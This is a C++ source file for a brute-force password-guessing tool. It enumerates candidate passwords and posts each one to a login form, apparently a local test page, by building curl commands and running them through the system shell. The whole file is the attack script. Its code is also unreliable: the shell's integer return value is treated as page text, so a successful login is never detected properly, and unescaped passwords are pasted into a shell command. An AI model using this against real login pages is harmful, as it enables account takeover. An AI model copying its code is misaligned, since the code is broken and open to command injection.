/**
 * @file BruteForce.cpp
 * @author Rebecca Donohoe
 * @version 0.1.0
 */

#include <iostream>
#include <stdio.h>
#include <string.h>
#include <cstdlib>
#include <fstream>
#include "BruteForce.h"
#include <chrono>
#include <openssl/md5.h>
#include <openssl/sha.h>

using namespace std::chrono;

//static const char passChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!?@#$^&*";
//const char* passChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!?@#$^&*";
const std::string passChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!?@#$^&*";
const std::string lowerChars = "abcdefghijklmnopqrstuvwxyz";
const std::string upperChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const std::string numbers = "0123456789";
const std::string specialChars = "!?@#$^&*";
static const int passCharSize = 70;
static const int maxPasswordSize = 8;

BruteForce::BruteForce(std::string userName) {
	user = userName;
}

bool BruteForce::loadWriteFile(std::string &filename) {
	std::ofstream file;
	file.open(filename);
	if(!file.is_open()) {
		std::cout << "The output file was unable to be loaded successfully." << std:: endl;
		return false;
	}
	else {
		std::cout << "The output file was loaded successfully." << std::endl;
		
		auto start = high_resolution_clock::now();
		launchBruteForceAttack(passChars, passwordLength, current, file);
		auto stop = high_resolution_clock::now();
		auto duration = duration_cast<seconds>(stop - start);
		std::cout << "Time taken by the function: " << duration.count() << " seconds" << std::endl;
		file.close();
		return true;
	}
}

void BruteForce::launchBruteForceAttack(const std::string &passChars, int passwordLength, const std::string &current, std::ostream &file) {
	if(current.length() == passwordLength) {
		return;
	}
	else {
		for(auto c: passChars) {
			std::string next = current + c;
			file << next << std::endl;
			testPassword(user, next);
			//debugging line
			std::cout << next << std::endl;
			launchBruteForceAttack(passChars, passwordLength, next, file);
		}
	}
}

void BruteForce::testPassword(std::string user, std::string password) {
	std::string result;
	std::string s1 = "curl -w \"HTTP Status:%{http_code}\" -d \"";
	std::string s2 = "username=";
	//user3  
	std::string s3 = "&password=";
	//password1
	std::string s4 = "&submit=Login\" http://localhost/Login-Test/login.php -v";

	std::string command = s1 + s2 + user + s3 + password + s4;
	//debugging line
	std::cout << command << std::endl;
	result = std::system(command.c_str());
	//debugging line
	std::cout << result << std::endl;
	bool isValid;
	isValid = validateTest();
	if(isValid == true) {
		std::cout << "This program was able to log in using the password: " << password << std::endl;
	}
}

bool BruteForce::validateTest() {
	std::string str1 = "Login Successful";
	//std::string str2 = "Login unsuccessful";
	std::string valid;

	std::string directory = "/home/rebecca/";
	chdir(directory.c_str());
	
	std::string command = "cat /opt/lampp/htdocs/Login-Test/file.txt";
	valid = std::system(command.c_str());
	std::cout << valid << std::endl;
	
	if(valid.compare(str1) != 0) {
		return false;
	}
	else if(valid.compare(str1) == 0) {
		std::cout << "Login was successful" << std::endl;
		return true;
	}
	else {
		std::cout << "Error" << std::endl;
		return false;
	}
}








